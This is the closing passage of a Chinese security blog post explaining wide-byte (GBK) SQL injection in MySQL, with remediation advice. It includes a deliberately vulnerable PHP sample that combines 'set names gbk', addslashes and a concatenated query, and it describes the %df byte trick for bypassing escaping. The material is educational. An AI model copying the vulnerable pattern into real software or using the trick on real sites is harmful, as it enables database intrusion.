class="string">"HTTP_HOST"</span>]; <span class="comment">// 获取请求中的Host</span></span><br><span class="line"></span><br><span class="line">$host = addslashes($host);<span class="comment">//将数据内容进行转义</span></span><br></pre></td></tr></table></figure>



<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="什么是宽字节注入"><a href="#什么是宽字节注入" class="headerlink" title="什么是宽字节注入"></a>什么是宽字节注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一个gbk汉字占用两个字节，一个utf-8汉字占用三个字节。</span><br><span class="line">宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</span><br><span class="line">PHP把&apos;转义为\&apos;</span><br><span class="line">mysql 将%df\&apos; 中的%df\ 认为是一个GBK字符，所谓的吃掉了\ 导致sql注入</span><br></pre></td></tr></table></figure>

<h4 id="宽字节编码的种类"><a href="#宽字节编码的种类" class="headerlink" title="宽字节编码的种类"></a>宽字节编码的种类</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GB2312、GBK、GB18030、BIG5、Shift_JIS等</span><br></pre></td></tr></table></figure>

<h4 id="MySQL中用于转义的函数"><a href="#MySQL中用于转义的函数" class="headerlink" title="MySQL中用于转义的函数"></a>MySQL中用于转义的函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addslashes</span><br><span class="line">mysql_real_escape_string</span><br><span class="line">mysql_escape_string</span><br><span class="line">以及后面在高版本被去除的magic_quote_gpc</span><br></pre></td></tr></table></figure>

<h4 id="后端代码-2"><a href="#后端代码-2" class="headerlink" title="后端代码"></a>后端代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,****,<span class="string">'testt'</span>);</span><br><span class="line"></span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">mysqli_query($con,<span class="string">"set names gbk"</span>); <span class="comment">//设置字符编码为GBK</span></span><br><span class="line"></span><br><span class="line">$id = addslashes($id); <span class="comment">//将获取id的数据进行转义</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from test where id='$id'"</span>;</span><br><span class="line"></span><br><span class="line">$res = mysqli_query($con,$sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysqli_error());</span><br><span class="line"></span><br><span class="line">$row = mysqli_fetch_array($res);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $row[<span class="string">'user'</span>].$ row[<span class="string">'id'</span>].$row[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.设置character_set_client=binary，将数据以二进制形式传递</span><br><span class="line">    mysql客户端查看当前字符集</span><br><span class="line">    	show variables like &quot;%char%&quot;;</span><br><span class="line">    	在安装MySQL时可以设置服务器的默认编码格式，也可对my.ini做修改，修改[mysqld]里面的					 	character_set_server=utf8，则可设置character_set_server的值。</span><br><span class="line"></span><br><span class="line">2.矫正人们对于mysql_real_escape_string的误解，单独调用set names gbk和mysql_real_escape_string是无法避免宽   字符注入问题的。还得调用mysql_set_charset来设置一下字符集。</span><br><span class="line"></span><br><span class="line">3.谨慎使用iconv来转换字符串编码，很容易出现问题。只要我们把前端html/js/css所有编码设置成gbk，mysql/php编码设	置	成gbk，就不会出现乱码问题。不用画蛇添足地去调用iconv转换编码，造成不必要的麻烦。</span><br></pre></td></tr></table></figure>


            <hr>
          </div>
          <br>
          <div>
            <p>
            
              <span>
                <i class="iconfont icon-inbox"></i>
                
                  <a class="hover-with-bg" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8">数据库安全</a>
                  &nbsp;
                
              </span>&nbsp;&nbsp;
            
            
              <span>
                <i class="iconfont icon-tag"></i>
                
                  <a class="hover-with-bg" href="/tags/sql%E6%B3%A8%E5%85%A5">sql注入</a>
                
                  <a class="hover-with-bg" href="/tags/mysql">mysql</a>
                
              </span>
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
      <br><br>
      
      
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script>
      var disqus_config = function () {
        this.page.url = 'http://yoursite.com/2019/11/28/mysql注入漏洞方法及原理整理/';
        this.page.identifier = '/2019/11/28/mysql注入漏洞方法及原理整理/';
      };
      var oldLoad = window.onload;
      window.onload = function () {
        var d = document, s = d.createElement('script');
        s.type = 'text/javascript';
        s.src = '//' + '13l00m# your shortname' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
      };
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="nofollow noopener noopener">comments
        powered by Disqus.</a></noscript>
  </div>


    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">    
Welcome to 13l00m'world
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
  
  <br>



    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  




  <script src="/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  ');
      prettyPrint();
    })
  </script>



  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "mysql注入漏洞方法及原理整理&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>







</body>
</html>
